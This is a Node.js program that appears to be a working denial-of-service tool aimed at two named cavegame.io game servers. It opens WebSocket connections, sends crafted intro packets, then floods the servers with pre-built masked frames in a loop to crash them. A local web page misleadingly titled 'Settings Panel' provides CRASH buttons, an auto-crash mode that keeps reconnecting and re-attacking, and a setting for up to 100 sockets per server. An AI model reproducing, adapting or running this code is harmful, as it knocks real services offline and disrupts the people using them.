const v8 = require('v8');
v8.setFlagsFromString('--max-old-space-size=512');

const WebSocket = require('ws');
const http = require('http');
const https = require('https');

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

const SERVERS = {
  US: 'wss://ip-207-148-8-148.cavegame.io',
  MR: 'wss://ip-144-202-48-35.cavegame.io'
};

let SOCKETS_PER_SERVER = 1;
let slots = {};
let floodServers = { US: false, MR: false };
let autoCrash = { US: false, MR: false };
let crashReady = { US: false, MR: false };

const wssAgent = new https.Agent({ rejectUnauthorized: false });

const PACKET_48 = Uint8Array.from([48]);
const B1 = Buffer.from([35, 1]);
const B0 = Buffer.from([35, 0]);
const B36 = Buffer.from([36, 0]);

const CHUNK = 1000;
function buildChunk(data) {
  const frameLen = 6 + data.length;
  const buf = Buffer.allocUnsafe(frameLen * CHUNK);
  for (let i = 0; i < CHUNK; i++) {
    const off = i * frameLen;
    buf[off] = 0x82;
    buf[off + 1] = 0x80 | data.length;
    const mask = ((i * 0x9e3779b9) & 0xFFFFFFFF) >>> 0;
    buf[off + 2] = (mask >> 24) & 0xFF;
    buf[off + 3] = (mask >> 16) & 0xFF;
    buf[off + 4] = (mask >> 8) & 0xFF;
    buf[off + 5] = mask & 0xFF;
    for (let j = 0; j < data.length; j++)
      buf[off + 6 + j] = data[j] ^ buf[off + 2 + (j % 4)];
  }
  return buf;
}
const FB1 = buildChunk(B1), FB0 = buildChunk(B0), FB36 = buildChunk(B36);

function buildPacket(...bytes) {
  const n = Math.floor(Math.random() * 10000);
  return Uint8Array.from([...bytes, ...Array.from(String(n), c => c.charCodeAt(0))]);
}

function buildIntroPacket() {
  return buildPacket(31, 1, 13, 240, 159, 148, 146, 13, 240, 159, 148, 145);
}

function startFloodLoop(ws) {
  ws._gen = (ws._gen || 0) + 1;
  const myGen = ws._gen;
  ws._looping = true;
  (function sendNext() {
    if (!ws._looping || ws._gen !== myGen || ws.readyState !== WebSocket.OPEN) return;
    const sock = ws._socket;
    try {
      while (ws._looping && ws._gen === myGen && ws.readyState === WebSocket.OPEN) {
        for (let i = 0; i < 50; i++) {
          sock.write(FB1);
          sock.write(FB0);
          sock.write(FB36);
        }
        if (sock.writableNeedDrain) {
          sock.once('drain', sendNext);
          return;
        }
      }
    } catch {}
    if (ws._looping && ws._gen === myGen && ws.readyState === WebSocket.OPEN) {
      setImmediate(sendNext);
    }
  })();
}

function startCrash(ws, key) {
  try { ws.send(PACKET_48); ws.send(buildIntroPacket()); } catch {
    // Socket is dead — remove and let ensureConnected create a fresh one
    const arr = slots[key] || [];
    const idx = arr.indexOf(ws);
    if (idx !== -1) arr.splice(idx, 1);
    try { ws.terminate(); } catch {}
    return;
  }
  if (crashReady[key]) { startFloodLoop(ws); return; }
  ws._awaiting10 = true;
  ws._onCrashMsg = (data) => {
    if (ws._awaiting10 && (Buffer.isBuffer(data) ? data[0] : data.charCodeAt(0)) === 10) {
      ws._awaiting10 = false;
      ws.removeListener('message', ws._onCrashMsg);
      crashReady[key] = true;
      if (floodServers[key]) startFloodLoop(ws);
    }
  };
  ws.on('message', ws._onCrashMsg);
  ws._crashTimer = setTimeout(() => {
    if (ws._awaiting10) {
      ws._awaiting10 = false;
      ws.removeListener('message', ws._onCrashMsg);
      crashReady[key] = true;
      if (floodServers[key]) startFloodLoop(ws);
    }
  }, 1000);
}

function createSocket(key) {
  let ws;
  try {
    ws = new WebSocket(SERVERS[key], { agent: wssAgent });
  } catch {
    return null;
  }
  ws._key = key;
  ws.on('open', () => {
    if (floodServers[key]) startCrash(ws, key);
  });
  function tryConnect() {
    setImmediate(() => {
      const a = slots[key] || [];
      if (a.length >= SOCKETS_PER_SERVER) return;
      const w = createSocket(key);
      if (w) { a.push(w); slots[key] = a; }
      else tryConnect();
    });
  }
  function handleDisconnect() {
    const arr = slots[key] || [];
    const idx = arr.indexOf(ws);
    if (idx !== -1) arr.splice(idx, 1);
    if (arr.length === 0 && floodServers[key]) {
      if (!autoCrash[key]) { floodServers[key] = false; crashReady[key] = false; }
      ensureConnected(key);
      return;
    }
    tryConnect();
  }
  ws.on('close', handleDisconnect);
  ws.on('error', () => {
    try { ws.terminate(); } catch {}
    handleDisconnect();
  });
  return ws;
}

function ensureConnected(key) {
  const arr = slots[key] || [];
  if (arr.length < SOCKETS_PER_SERVER) {
    for (let i = arr.length; i < SOCKETS_PER_SERVER; i++) {
      const ws = createSocket(key);
      if (ws) arr.push(ws);
    }
    slots[key] = arr;
    if (arr.length < SOCKETS_PER_SERVER) {
      setImmediate(() => ensureConnected(key));
    }
  } else if (arr.length > SOCKETS_PER_SERVER) {
    const excess = arr.splice(SOCKETS_PER_SERVER);
    for (const ws of excess) {
      ws._looping = false;
      try { ws.terminate(); } catch {}
    }
  }
}

function applyChanges(onlyKey) {
  const keys = onlyKey ? [onlyKey] : Object.keys(SERVERS);
  for (const key of keys) {
    for (const ws of (slots[key] || [])) {
      ws._looping = false;
      ws._awaiting10 = false;
      clearTimeout(ws._crashTimer);
      if (ws._onCrashMsg) ws.removeListener('message', ws._onCrashMsg);
    }
    if (!floodServers[key]) crashReady[key] = false;
    for (const ws of [...(slots[key] || [])]) {
      if (ws.readyState === WebSocket.OPEN && floodServers[key]) startCrash(ws, key);
    }
    ensureConnected(key);
  }
}

function parsePath(url) {
  const q = url.indexOf('?');
  return q === -1 ? url : url.slice(0, q);
}

function qsVal(url, name) {
  const q = url.indexOf('?');
  if (q === -1) return null;
  return new URLSearchParams(url.slice(q)).get(name);
}

const server = http.createServer((req, res) => {
  const path = parsePath(req.url);

  try {
    if (path === '/api/status') {
      const count = key => (slots[key] || []).filter(w => w.readyState === WebSocket.OPEN).length;
      const state = key => {
        const arr = slots[key] || [];
        if (arr.some(w => w.readyState === WebSocket.OPEN)) return 'connected';
        if (arr.some(w => w.readyState === WebSocket.CONNECTING)) return 'connecting';
        return 'error';
      };
      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({
        usCount: count('US'), mrCount: count('MR'),
        usTarget: SOCKETS_PER_SERVER, mrTarget: SOCKETS_PER_SERVER,
        totalConnected: count('US') + count('MR'),
        floodUS: floodServers.US, floodMR: floodServers.MR,
        autoUS: autoCrash.US, autoMR: autoCrash.MR,
        socketsPerServer: SOCKETS_PER_SERVER,
        usState: state('US'), mrState: state('MR')
      }));
    }

    if (path === '/api/toggle') {
      const key = qsVal(req.url, 'server');
      if (!SERVERS[key]) { res.writeHead(400); return res.end('bad server'); }
      if (!floodServers[key] && !autoCrash[key]) {
        floodServers[key] = true;
        applyChanges(key);
      }
      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ ok: true }));
    }

    if (path === '/api/auto') {
      const key = qsVal(req.url, 'server');
      const state = qsVal(req.url, 'state') === 'true';
      if (!SERVERS[key]) { res.writeHead(400); return res.end('bad server'); }
      autoCrash[key] = state;
      if (state) {
        if (!floodServers[key]) {
          floodServers[key] = true;
          applyChanges(key);
        }
      } else {
        if (floodServers[key]) {
          floodServers[key] = false;
          applyChanges(key);
        }
      }
      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ ok: true }));
    }

    if (path === '/api/reset') {
      const key = qsVal(req.url, 'server');
      if (!SERVERS[key]) { res.writeHead(400); return res.end('bad server'); }
      for (const ws of (slots[key] || [])) {
        ws._looping = false;
        try { ws.terminate(); } catch {}
      }
      slots[key] = [];
      crashReady[key] = false;
      if (!autoCrash[key]) floodServers[key] = false;
      ensureConnected(key);
      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ ok: true }));
    }

    if (path === '/api/config') {
      const count = parseInt(qsVal(req.url, 'count'));
      if (count > 0 && count <= 100) {
        SOCKETS_PER_SERVER = count;
        applyChanges();
        res.writeHead(200, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({ ok: true, socketsPerServer: SOCKETS_PER_SERVER }));
      }
      res.writeHead(400);
      return res.end('bad count');
    }

    if (path === '/api/sync') {
      const aUS = qsVal(req.url, 'autoUS') === 'true';
      const aMR = qsVal(req.url, 'autoMR') === 'true';
      const cnt = parseInt(qsVal(req.url, 'count'));
      if (cnt > 0 && cnt <= 100) SOCKETS_PER_SERVER = cnt;
      autoCrash.US = aUS;
      autoCrash.MR = aMR;
      if (aUS && !floodServers.US) { floodServers.US = true; applyChanges('US'); }
      if (aMR && !floodServers.MR) { floodServers.MR = true; applyChanges('MR'); }
      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ ok: true }));
    }
  } catch { res.writeHead(500); return res.end('err'); }

  res.writeHead(200, { 'Content-Type': 'text/html' });
  res.end(`<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Settings Panel</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{overflow:hidden;height:100vh;background:radial-gradient(circle at top left,#1e3a8a,#0f172a);font-family:Inter,Arial,sans-serif;display:flex;align-items:center;justify-content:center}
.panel{width:420px;border-radius:32px;background:white;overflow:hidden;position:absolute;box-shadow:0 25px 60px rgba(0,0,0,.35);user-select:none;backdrop-filter:blur(20px)}
.header{height:110px;background:linear-gradient(135deg,#2563eb,#7dd3fc);position:relative;display:flex;align-items:center;justify-content:center}
.header h1{color:white;font-size:30px;font-weight:800;letter-spacing:.5px;z-index:2}
.content{padding:30px}
.server{background:#f8fafc;border-radius:22px;padding:20px;margin-bottom:18px;display:flex;align-items:center;justify-content:space-between;transition:.2s;border:1px solid #e2e8f0}
.server:hover{transform:translateY(-2px);box-shadow:0 10px 25px rgba(0,0,0,.08)}
.left{display:flex;flex-direction:column;gap:8px}
.name{font-size:22px;font-weight:800;color:#0f172a}
.status{display:flex;align-items:center;gap:8px;color:#475569;font-size:14px;font-weight:600}
.dot{width:11px;height:11px;border-radius:50%}
.connected{background:#22c55e;box-shadow:0 0 12px #22c55e}
.connecting{background:#f59e0b;box-shadow:0 0 12px #f59e0b}
.disconnected{background:#ef4444;box-shadow:0 0 12px #ef4444}
.sockets{color:#64748b;font-size:14px;font-weight:700}
.controls{display:flex;align-items:center;gap:10px}
.crash-btn{padding:8px 16px;border:none;border-radius:10px;font-size:13px;font-weight:800;cursor:pointer;transition:.2s;letter-spacing:.5px;white-space:nowrap}
.crash-btn.green{background:linear-gradient(135deg,#22c55e,#4ade80);color:white;box-shadow:0 4px 12px rgba(34,197,94,.4)}
.crash-btn.green:hover{transform:scale(1.05);box-shadow:0 6px 20px rgba(34,197,94,.5)}
.crash-btn.yellow{background:linear-gradient(135deg,#eab308,#facc15);color:#422006;box-shadow:0 4px 12px rgba(234,179,8,.4);cursor:default}
.crash-btn.gray{background:linear-gradient(135deg,#94a3b8,#cbd5e1);color:#475569;box-shadow:0 4px 12px rgba(148,163,184,.4);cursor:default}
.reset-btn{padding:6px 12px;border:none;border-radius:8px;font-size:11px;font-weight:800;cursor:pointer;transition:.2s;letter-spacing:.5px;background:linear-gradient(135deg,#7c3aed,#a78bfa);color:white;box-shadow:0 4px 12px rgba(124,58,237,.4);white-space:nowrap}
.reset-btn:hover{transform:scale(1.05);box-shadow:0 6px 20px rgba(124,58,237,.5)}
.switch{position:relative;width:44px;height:24px;flex-shrink:0}
.switch input{display:none}
.slider{position:absolute;inset:0;border-radius:999px;background:#cbd5e1;transition:.25s;cursor:pointer}
.slider::before{content:'';position:absolute;width:18px;height:18px;border-radius:50%;background:white;top:3px;left:3px;transition:.25s;box-shadow:0 2px 6px rgba(0,0,0,.2)}
input:checked+.slider.yellow{background:linear-gradient(135deg,#eab308,#facc15);box-shadow:0 0 12px rgba(234,179,8,.5)}
input:checked+.slider.yellow::before{transform:translateX(20px)}
.config-row{display:flex;align-items:center;justify-content:space-between;padding:14px 20px;background:#f8fafc;border-radius:22px;border:1px solid #e2e8f0;margin-top:18px}
.config-row label{font-size:14px;font-weight:700;color:#0f172a}
.config-row input{width:70px;padding:8px 10px;border:1px solid #e2e8f0;border-radius:10px;font-size:14px;font-weight:600;text-align:center;outline:none;background:white;color:#0f172a}
.config-row input:focus{border-color:#2563eb;box-shadow:0 0 0 3px rgba(37,99,235,.15)}
</style>
</head>
<body>
<div class="panel" id="panel" style="display:none">
  <div class="header"><h1>Settings Panel</h1></div>
  <div class="content">
    <div class="server">
      <div class="left">
        <div class="name">US</div>
        <div class="status"><div class="dot disconnected" id="usDot"></div><span id="usText">Disconnected</span></div>
        <div class="sockets"><span id="usSockets">0</span>/<span id="usTarget">0</span> sockets</div>
      </div>
      <div class="controls">
        <button class="crash-btn green" id="btnUS">CRASH</button>
        <label class="switch"><input type="checkbox" id="autoUS"><span class="slider yellow"></span></label>
        <button class="reset-btn" id="resetUS">RESET</button>
      </div>
    </div>
    <div class="server">
      <div class="left">
        <div class="name">MR</div>
        <div class="status"><div class="dot disconnected" id="mrDot"></div><span id="mrText">Disconnected</span></div>
        <div class="sockets"><span id="mrSockets">0</span>/<span id="mrTarget">0</span> sockets</div>
      </div>
      <div class="controls">
        <button class="crash-btn green" id="btnMR">CRASH</button>
        <label class="switch"><input type="checkbox" id="autoMR"><span class="slider yellow"></span></label>
        <button class="reset-btn" id="resetMR">RESET</button>
      </div>
    </div>
    <div class="config-row">
      <label>Sockets per server</label>
      <input type="number" id="socketCount" min="1" max="100" value="1" />
    </div>
  </div>
</div>
<script>
const panel=document.getElementById('panel');
let dragging=0,offX=0,offY=0;
panel.onmousedown=e=>{dragging=1;offX=e.clientX-panel.offsetLeft;offY=e.clientY-panel.offsetTop};
document.onmousemove=e=>{if(!dragging)return;panel.style.left=(e.clientX-offX)+'px';panel.style.top=(e.clientY-offY)+'px'};
document.onmouseup=()=>dragging=0;

const btnUS=document.getElementById('btnUS'),btnMR=document.getElementById('btnMR');
const resetUS=document.getElementById('resetUS'),resetMR=document.getElementById('resetMR');
const autoUS=document.getElementById('autoUS'),autoMR=document.getElementById('autoMR');
const usDot=document.getElementById('usDot'),mrDot=document.getElementById('mrDot');
const usText=document.getElementById('usText'),mrText=document.getElementById('mrText');
const usSock=document.getElementById('usSockets'),mrSock=document.getElementById('mrSockets');
const usTgt=document.getElementById('usTarget'),mrTgt=document.getElementById('mrTarget');
const sockCount=document.getElementById('socketCount');

autoUS.checked=localStorage.getItem('autoUS')==='true';
autoMR.checked=localStorage.getItem('autoMR')==='true';
sockCount.value=localStorage.getItem('socketCount')||'1';

btnUS.onclick=()=>{
  if(btnUS.classList.contains('green'))
    fetch('/api/toggle?server=US');
};
btnMR.onclick=()=>{
  if(btnMR.classList.contains('green'))
    fetch('/api/toggle?server=MR');
};
resetUS.onclick=()=>fetch('/api/reset?server=US');
resetMR.onclick=()=>fetch('/api/reset?server=MR');
autoUS.onchange=()=>{
  localStorage.setItem('autoUS',autoUS.checked);
  fetch('/api/auto?server=US&state='+autoUS.checked);
};
autoMR.onchange=()=>{
  localStorage.setItem('autoMR',autoMR.checked);
  fetch('/api/auto?server=MR&state='+autoMR.checked);
};
sockCount.onchange=()=>{
  const n=parseInt(sockCount.value);
  if(!n||n<1||n>100)return;
  localStorage.setItem('socketCount',n);
  fetch('/api/config?count='+n);
};

function setBtn(el,state){
  const classes=['green','yellow','gray'];
  for(const c of classes)el.classList.remove(c);
  el.classList.add(state);
}
async function update(){
  try {
    const r=await fetch('/api/status');
    const d=await r.json();
    usDot.className='dot '+(d.usState==='connected'?'connected':d.usState==='connecting'?'connecting':'disconnected');
    usText.textContent=d.usState==='connected'?'Connected':d.usState==='connecting'?'Connecting...':'Error';
    mrDot.className='dot '+(d.mrState==='connected'?'connected':d.mrState==='connecting'?'connecting':'disconnected');
    mrText.textContent=d.mrState==='connected'?'Connected':d.mrState==='connecting'?'Connecting...':'Error';
    usSock.textContent=d.usCount||0;mrSock.textContent=d.mrCount||0;
    usTgt.textContent=d.usTarget||0;mrTgt.textContent=d.mrTarget||0;
    function updateBtn(btn,state,auto,flood){
      if(state!=='connected'){setBtn(btn,'gray');btn.textContent='OFFLINE';}
      else if(auto){setBtn(btn,'gray');btn.textContent='AUTO';}
      else if(flood){setBtn(btn,'yellow');btn.textContent='CRASHING';}
      else{setBtn(btn,'green');btn.textContent='CRASH';}
    }
    updateBtn(btnUS,d.usState,d.autoUS,d.floodUS);
    updateBtn(btnMR,d.mrState,d.autoMR,d.floodMR);
    if(autoUS.checked!==d.autoUS)autoUS.checked=d.autoUS;
    if(autoMR.checked!==d.autoMR)autoMR.checked=d.autoMR;
  } catch(e){}
}

async function initialSync(){
  try {
    const aUS=localStorage.getItem('autoUS')==='true';
    const aMR=localStorage.getItem('autoMR')==='true';
    const cnt=localStorage.getItem('socketCount')||'1';
    await fetch('/api/sync?autoUS='+aUS+'&autoMR='+aMR+'&count='+cnt);
  } catch(e){}
}
setInterval(update,500);
Promise.all([update(), initialSync()]).then(() => panel.style.display = '').catch(() => panel.style.display = '');
</script>
</body>
</html>`);
});

const PORT = process.env.PORT || 3000;
server.listen(PORT);

for (const key in SERVERS) {
  ensureConnected(key);
}
